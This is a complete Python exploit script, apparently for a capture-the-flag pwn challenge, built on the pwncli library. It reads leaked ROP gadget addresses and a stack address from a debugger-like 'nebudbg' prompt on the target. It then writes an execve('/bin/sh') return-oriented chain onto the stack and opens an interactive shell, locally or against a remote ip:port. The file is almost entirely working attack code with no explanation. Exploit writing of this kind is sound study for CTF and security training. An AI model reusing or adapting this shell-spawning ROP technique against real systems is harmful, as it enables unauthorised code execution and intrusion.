#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
# libc: ELF = gift.libc


def cmd(data):
    ru(b"nebudbg> ")
    sl(data)


cmd(b"gift")
ru(b"Gifts:")
ru(b"0x")
pop_rdi_ret = int(ru(b"->", drop=True).replace(b" ", b""), 16)
ru(b"0x")
pop_rsi_ret = int(ru(b"->", drop=True).replace(b" ", b""), 16)
ru(b"0x")
pop_rdx_ret = int(ru(b"->", drop=True).replace(b" ", b""), 16)
ru(b"0x")
pop_rax_ret = int(ru(b"->", drop=True).replace(b" ", b""), 16)
ru(b"0x")
syscall_ret = int(ru(b"->", drop=True).replace(b" ", b""), 16)

cmd(b"stack 0x200")
ru(b"<-- rsp")
ru(b"0x")
stack_base = int(ru(b"| 0x", drop=True).replace(b" ", b""), 16) + 0x130


def write(addr, data):
    cmd(b"set " + hex(addr).encode() + b" " + hex(data).encode())


write(stack_base, pop_rdi_ret)
write(stack_base + 0x8, stack_base + 0x40 - 0x130 + 0x48)
write(stack_base + 0x10, pop_rsi_ret)
write(stack_base + 0x18, 0)
write(stack_base + 0x20, pop_rdx_ret)
write(stack_base + 0x28, 0)
write(stack_base + 0x30, pop_rax_ret)
write(stack_base + 0x38, 0x3B)
write(stack_base + 0x40, syscall_ret)

cmd(b"a" * 0x10 + b"/bin/sh\x00")

ia()
